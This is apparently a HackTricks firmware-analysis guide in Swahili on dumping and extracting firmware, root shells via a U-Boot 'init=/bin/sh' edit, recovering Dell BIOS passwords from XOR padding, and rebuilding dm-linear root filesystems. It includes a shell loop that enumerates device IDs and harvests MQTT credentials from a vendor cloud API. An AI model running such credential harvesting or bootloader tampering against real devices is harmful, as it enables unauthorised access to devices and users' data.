# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

Kwa upatikanaji kupitia miingiliano ya maunzi iliyo wazi, angalia [kutupa firmware kwa kutumia UART console](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) na [kutupa SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Kwa kunasa UART wakati wa kuwasha kifaa kwa njia inayoweza kurudiwa kabla ya kufikia console, angalia [upatikanaji unaodhibitiwa na SCPI kwa kutumia umeme na oscilloscope](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kurahisisha mawasiliano kati ya vipengele vya maunzi na programu ambazo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, ili kuhakikisha kifaa kinaweza kufikia maagizo muhimu mara tu kinapowashwa, na hivyo kuanzisha mfumo wa uendeshaji. Kuchunguza na ikiwezekana kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo mahususi ya bootloader
- Mpangilio wa maunzi na datasheet
- Vipimo vya codebase na maeneo ya source code
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa kusudi hili, zana za **open-source intelligence (OSINT)** zina manufaa makubwa, pamoja na uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa uchanganuzi tuli wa bila malipo unaoweza kutumiwa kutafuta matatizo yanayoweza kutokea.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka chanzo (watengenezaji, wazalishaji)
- **Kuijenga** kwa kutumia maagizo yaliyotolewa
- **Kuipakua** kutoka tovuti rasmi za usaidizi
- Kutumia hoja za **Google dork** kutafuta faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuingilia **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kutoka kwenye kifaa kupitia miunganisho kama **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), au **PICit**
- **Kusikiliza** maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **vituo vya masasisho vilivyowekwa moja kwa moja kwenye msimbo**
- **Kuitupa** kutoka kwenye bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, kama njia nyingine zote zitashindikana, kwa kutumia zana zinazofaa za maunzi

### Kumbukumbu za UART pekee: lazimisha root shell kupitia mazingira ya U-Boot kwenye flash

Ikiwa UART RX imepuuzwa (kumbukumbu pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** ukiwa nje ya mtandao:<sup>[[6]](#references)</sup>

1. Tupa SPI flash kwa kutumia klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili iwe na `init=/bin/sh`, na **ukokotoe upya CRC32 ya U-Boot env** ya blob.
3. Flash upya env partition pekee na uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini env partition inaweza kuandikiwa kupitia ufikiaji wa flash ya nje.

## Kuchanganua firmware

Sasa kwa kuwa **unayo firmware**, unahitaji kuitoa taarifa ili ujue jinsi ya kuishughulikia. Zifuatazo ni baadhi ya zana unazoweza kutumia:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hujapata mengi kwa kutumia zana hizo, angalia **entropia** ya image kwa `binwalk -E <bin>`. Ikiwa entropia ni ndogo, huenda image haijasimbwa kwa usimbaji fiche. Ikiwa entropia ni kubwa, huenda imesimbwa kwa usimbaji fiche (au imebanwa kwa namna fulani).

Aidha, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au tumia [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Vipengee ghafi vya onyesho kwenye flash ya nje

SPI dump ya nje si lazima iwe firmware inayotekelezeka ya MCU. Kwa kifaa lengwa cha Cortex-M, linganisha mwanzo wa kila eneo linalowezekana kuwa na code na ramani ya kumbukumbu ya kifaa: vector table ya kawaida huanza na anwani inayowezekana ya SRAM stack pointer na anwani ya reset handler iliyo kwenye kumbukumbu inayotekelezeka. Kutokuwepo kwa vector table kwenye offset sifuri pekee hakuthibitishi kuwa chipu nzima haina code; kagua offset nyingine na mpangilio wa boot. Ikiwa `binwalk` haipati container, kagua raw bytes na ulinganishe anwani za usomaji wa flash na matendo yanayopakia skrini mpya, ukitumia [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Kwa eneo lenye display assets, jaribu pixel format na vipimo mbalimbali badala ya kudhani ni PNG/JPEG. Kifaa kilichotajwa kilitumia fremu za **80×160 RGB565 little-endian**: kwa kutumia baiti mbili kwa kila pikseli, fremu moja ni **25,600 bytes** (25 KiB), si kilobiti 24. Anwani ya usomaji wa flash iliyodekodiwa ilitambua offset ya screen asset; mtafiti alibadilisha picha iliyotayarishwa kwa `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, akaweka asset yenye ukubwa sawa badala ya ile iliyokuwa kwenye dump ya awali, akaiandika kwa `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, na kuthibitisha kuwa picha mpya ilionekana kwenye display. Hili linaonyesha kuwa *external display assets* zinaweza kuandikwa, si kwamba firmware ya ndani ya MCU inaweza kutolewa au kuandikwa upya. Hifadhi dump ya awali na uthibitishe vipimo, mpangilio wa baiti, offset, na urefu wa data itakayobadilishwa kabla ya kuandika chochote.<sup>[[14]](#references)</sup>

### Uchambuzi tofauti wa flash na hifadhi ya siri ya XOR inayoweza kurejeshwa

Ikiwa firmware setting haina muundo wa hifadhi uliorekodiwa, kwanza fanya usomaji kadhaa unaolingana wa flash, badilisha **setting moja tu**, kisha dump chipu nzima tena na ulinganishe offset. Kurudia jaribio kwa thamani zilizodhibitiwa husaidia kutofautisha setting hiyo na counters pamoja na metadata ya uandishi; mabadiliko kwenye offset mpya badala ya sehemu ileile yanaashiria hifadhi ya append-only au log-structured. Hifadhi entries zilizofutwa/tombstoned kwa sababu baiti zake za payload huenda bado zikarejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa moduli za firmware kwa kutumia zana kama `binwalk`, kisha fanya reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya field, padding, indexing ya key na derivation ya key kwenye code badala ya kukisia scheme kutokana na mifumo ya ciphertext pekee.<sup>[[12]](#references)</sup>

#### Rejesha keys kutoka kwenye zero padding iliyosimbwa kwa njia fiche

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext hufichua byte za keystream katika offset zilezile. Field yenye ukubwa usiobadilika huathirika zaidi hasa pale zero padding yake inapofunika kila index ya key ya XOR inayojirudia: padding iliyosimbwa hufichua byte hizo za key moja kwa moja kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila index ya key imefunikwa, jenga upya key kutoka mwisho wa ciphertext na usimbue byte zilizo na data.<sup>[[12]](#references)</sup>

Muundo wa DVAR BIOS-password wa Dell ulio hatarini ni mfano halisi: byte `0` ya field ya byte 32 iko wazi, huku byte `1..31` zikitumia key inayojirudia ya byte 20.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa nywila `L`, nafasi `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha faharasa zote za ufunguo, kwa hivyo ufunguo na nywila kamili hupatikana bila brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata funguo kutoka kwenye rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takriban kama `modified_md5(device_seed || variable_GUID || password[0])`: device seed na GUID hazibadiliki, na ingizo pekee linalotegemea nenosiri ni byte ya kwanza iliyo wazi. Hii hutoa funguo zisizozidi 256 kwa kila kifaa, na hivyo rekodi zinazoanza kwa byte ileile hushiriki ufunguo. Panga rekodi zinazotumika na zilizofutwa kwa byte hiyo; rekodi fupi ya kihistoria inaweza kuvuja ufunguo kamili kupitia padding na kufungua rekodi ya sasa iliyo ndefu zaidi ambayo padding yake haitoshi. Kwa hiyo, kubadilisha nenosiri kunaweza kuongeza hatari ya kuvuja taarifa wakati ciphertext ya zamani inawekwa alama ya kufutwa badala ya kufutwa kabisa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hutafuta DVAR, huthibitisha rekodi zinazowezekana, hurejesha nywila, na inaweza kuonyesha byte ghafi zilizohifadhiwa/za ufunguo. Iunde kutoka kwenye checkout kisha uchanganue picha ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa matokeo chanya ya uongo kwa kutumia muundo wa rekodi, masharti ya herufi zinazoweza kuchapishwa, ukaguzi wa zero-padding, entropy ya key, na uthabiti pale key inapojirudia. Ikiwa dumps zinazorudiwa zinaonyesha mabadiliko machache ya biti kwa kila write, orodhesha masks zilizoonekana na panga masahihisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji sahihi.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya ciphertext inayoweza kurejeshwa, na log-structured stores zinapaswa kufuta kwa usalama nyenzo za siri zilizopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Filesystem

Kwa kutumia zana zilizotajwa awali kama `binwalk -ev <bin>`, ungepaswa kuwa umeweza **kutoa filesystem**.\
Kwa kawaida, Binwalk huitoa ndani ya **folda yenye jina la aina ya filesystem**, ambayo kwa kawaida ni mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Filesystem kwa Mikono

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na kuchonga filesystem iliyobanwa** kutoka kwenye binary, kisha **utoe filesystem kwa mikono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ifuatayo ili kuchonga mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baadaye, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za CPIO archive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kuunda upya mifumo ya faili ya root iliyopachikwa na kugawanywa

Ikiwa dump ghafi ya eMMC/SSD ina header halali ya mfumo wa faili lakini offsets za metadata zake zinaenea nje ya partition inayotarajiwa, usiihitimishe mara moja kuwa imeharibika. Boot code iliyopachikwa inaweza kuunda device halisi ya root kutoka kwenye safu nyingi halisi kwa kutumia Device Mapper, kwa hiyo kuchonga partition moja ya GPT hutoa sehemu ya kwanza pekee.<sup>[[9]](#references)</sup>

#### Kuchunguza kwa haraka picha kamili ya media

Kwanza thibitisha kwamba upataji umekamilika, ukubwa haujabadilika, na hakuna mchakato wa kuandika bado unaoshikilia picha hiyo. Ikiwa jina la faili lina anwani za mwanzo/mwisho, linganisha masafa hayo na idadi halisi ya byte. Rejesha GPT katika hali ya kusoma tu na uambatishe masafa yanayohitajika pekee; **usiendeshe** `vgchange -ay` dhidi ya physical volume isiyoaminika kwenye workstation, kwa sababu migongano ya volume group na uandishi usiokusudiwa unaweza kutokea.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Pendelea kutumia VM inayoweza kutupwa wakati mantiki asilia ya init au rundo la LVM linahitaji kuona image nzima. Kumbukumbu za kihistoria za boot kutoka kwenye partition ya kawaida ya boot ni muhimu hasa: bootloader huenda iliandika offsets za proprietary-container, urefu wa vipengele, uteuzi wa slot, kanuni za alignment, na uthibitishaji wa signature. Tumia thamani hizo kuchonga command line/kernel/initramfs iliyopachikwa, kisha uthibitishe kila matokeo kivyake kwa `file`, magic bytes, na `binwalk`; kusoma hadi mwisho wa container kunaweza kuambatisha initrd, object ya ACPI, au signature kwenye kernel bila kukusudia.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block ya wakati wa boot

Toa initramfs ya kernel na ufanye reverse engineering ya `/init` yake pamoja na maktaba zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuatilia marejeleo ya string za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64`, na njia za partition; kisha fuatilia code inayochagua slot amilifu ya A/B na kuunda table. Sehemu nzuri za kuanzia katika radare2 ni `r2 -A init`, `afl`, `pdf @ main`, na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target huweka ranges zinazofuatana za kifaa pepe kwenye ranges za kifaa kimoja au zaidi vinavyotoa hifadhi. Table ya sehemu mbili iliyorejeshwa kwa kawaida huwa na umbo hili (nafasi na urefu wote ni sectors za biti 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code sawasawa, ikijumuisha upana wa nambari kamili, shifts, na ubadilishaji wa vipimo. Kwa mfano, usemi ufuatao huzungusha ukubwa wa baiti kwenda chini hadi mpaka wa 4-KiB, kisha tu kuubadilisha kuwa sekta za baiti 512; kuubadilisha na `p4_bytes // 512` husogeza sehemu ya mwisho iliyochaguliwa kwa `p4_bytes % 4096` kila mara partition haijapangiliwa kwenye ukurasa.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Unda upya picha tambarare ya uchanganuzi kwa kunakili masafa kwa mpangilio wa jedwali, ukitumia vipande vyenye ukubwa wa juu uliowekwa badala ya kupakia dump nzima ya media kwenye kumbukumbu. Hii pia huepusha kuunda vifaa vya mapper upande wa host. Weka offsets zilizotokana na GPT, hesabu za sekta zilizogeuzwa, na urefu wa matokeo kama assertions tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu na hitilafu ya mara kwa mara ya uundaji upya

Kwa SquashFS, angalia magic ya `hsqs` na decode sehemu ya `bytes_used` ya 64-bit little-endian kwenye offset 40 ya superblock kabla ya kuendesha `unsquashfs`. Ikiwa uchimbaji unashindwa katika miundo kadhaa isiyohusiana, tafuta eneo pana kuzunguka nafasi zinazotarajiwa na utake wagombeaji wenye ushahidi thabiti wa kimuundo: block ya metadata inayoweza decompressed, maingizo kadhaa halali ya directory yanayofuatana, sehemu za inode zinazoeleweka, inode ya root inayolingana na idadi ya inode, au muundo halali wa integrity-metadata. Ulinganifu mmoja tu wa magic hautoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile yenye alama ya namba inapofanya miundo huru iwe halali—kwa mfano, metadata ya directory na rekodi ya verity—sababu inayowezekana ni hitilafu ya kimfumo ya mwanzo wa segment badala ya kukosekana kwa byte. Rudi kwenye hesabu iliyogeuzwa na utafute mabaki yaliyotupwa, signedness, overflow, au rounding ya sector/page kabla ya kujaribu kurejesha data ya orphan au kurekebisha metadata ya filesystem.<sup>[[9]](#references)</sup>

Hatimaye, weka mipaka ya ulinzi ikiwa tofauti: volumes za LUKS zilizofungwa na TPM hulinda usiri wa data, ilhali mapping ya dm-verity iliyotiwa saini hulinda uadilifu wa root filesystem. TPM ya software haiwezi kurejesha ufunguo uliofungwa kwa TPM halisi ya awali, na kuwasha SquashFS iliyorekebishwa kupitia init ya utafiti pekee inayoacha uthibitishaji wa verity hakughushi sahihi yake wala kuvunja dm-verity.<sup>[[9]](#references)</sup>

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partition na filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, hukaguliwa **entropy** kwa kutumia `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, ilhali entropy ya juu huashiria uwezekano wa usimbaji fiche au ukandamizaji.

Kwa kutoa **faili zilizopachikwa**, inapendekezwa kutumia zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye saraka iliyopewa jina la aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu byte za magic hazipo, uchimbaji wa mikono huhitajika. Hii inahusisha kutumia `binwalk` kupata offset ya mfumo wa faili, kisha kutumia amri ya `dd` kuuchopoa mfumo wa faili:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti ili kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, utafutaji wa dosari za usalama huanza. Huchunguzwa daemoni za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendaji wa update server, code ambayo haijakompailiwa, startup scripts na compiled binaries kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa credentials za watumiaji
- SSL certificates na keys katika **etc/ssl**
- Configuration files na script files kwa ajili ya udhaifu unaowezekana
- Embedded binaries kwa ajili ya uchambuzi zaidi
- Web servers na binaries zinazotumika kwa kawaida katika vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Ukaguzi wa Usalama wa Compiled Binaries

Source code na compiled binaries zinazopatikana kwenye filesystem lazima zichunguzwe kwa makini ili kubaini udhaifu. Zana kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kukusanya cloud config na MQTT credentials kupitia URL tokens zinazotokana na data nyingine

Hubs nyingi za IoT hupata configuration ya kila kifaa kutoka kwenye cloud endpoint inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa kuchambua firmware unaweza kugundua kuwa `<token>` hutokana na device ID ndani ya kifaa kwa kutumia secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata cloud config, ambayo mara nyingi hufichua MQTT credentials zilizo wazi na topic prefixes.

Mtiririko wa kazi wa vitendo:

1) Toa deviceId kutoka kwenye UART boot logs

- Unganisha adapta ya 3.3V UART (TX/RX/GND) na unase logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Rejesha STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Kokotoa token kwenye Bash na ubadilishe digest iwe herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na vitambulisho vya MQTT

- Unda URL na upakue JSON kwa kutumia curl; ichanganue kwa jq ili kutoa siri:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya maandishi wazi na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana kujisajili kwenye topics za maintenance na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha device IDs zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha vendor OUI/product/type bytes zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kujaribu IDs zinazowezekana, kupata tokens na kuchukua configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya enumeration kwa wingi.
- Inapowezekana, pendelea kutumia emulation au static analysis kurejesha siri bila kurekebisha hardware lengwa.

Mchakato wa kufanya emulation ya firmware huwezesha **dynamic analysis** ya utendaji wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au usanifu, lakini kuhamisha root filesystem au binaries mahususi kwenye kifaa chenye usanifu na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyoundwa awali, kunaweza kurahisisha majaribio zaidi.

### Kufanya Emulation ya Binaries Mahususi

Unapochunguza programu moja moja, ni muhimu kutambua endianness ya programu na usanifu wa CPU.

#### Mfano wa Usanifu wa MIPS

Ili kufanya emulation ya binary ya usanifu wa MIPS, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na ili kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binaries za little-endian, chaguo ni `qemu-mipsel`.

#### Emulation ya ARM Architecture

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa emulation.

### Emulation ya Mfumo Mzima

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha emulation ya firmware nzima, huendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

### Kujenga upya root filesystems zilizogawanywa na kuthibitishwa kwa ajili ya emulation

Ikiwa superblock ya SquashFS inasomeka lakini offsets za inode, directory au fragment-table haziwezekani, usiibadilishe `unsquashfs` mara moja. Reverse engineer binary ya early boot na uunde upya block-device graph inayoijenga: mifumo iliyopachikwa inaweza kuonyesha root partition ya kawaida lakini kujenga filesystem halisi kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata wakati kila metadata block inayofuata imehamishwa.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware jinsi zilivyo. Hasa, tambua kama urefu umeonyeshwa kwa bytes, sectors za baiti 512, au kurasa za 4 KiB; rudia shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata hadi mpaka wa 4 KiB, kisha huonyesha matokeo kama sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza extent iliyoongezwa kwa kilobytes chache na kuharibu majedwali yote ya SquashFS yanayofuata.<sup>[[11]](#references)</sup>

Mtiririko mzuri wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata kila segment ya `dm-linear` chanzo chake cha kifaa, sector ya kuanzia na urefu kutoka kwenye binary ya verifier/init.
2. Unganisha au panga extents bila kubadilisha semantiki zake za alignment.
3. Ikiwa extraction bado inashindwa, tafuta kwenye eneo dogo tu linalozunguka mpaka uliokadiriwa, na hitaji miundo kadhaa halali ya metadata mfululizo badala ya kukubali superblock inayoonekana kuwa sahihi pekee.
4. Tumia `unsquashfs` isiyobadilishwa kwenye image iliyojengwa upya; kuweza kupitia directories na fragments zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

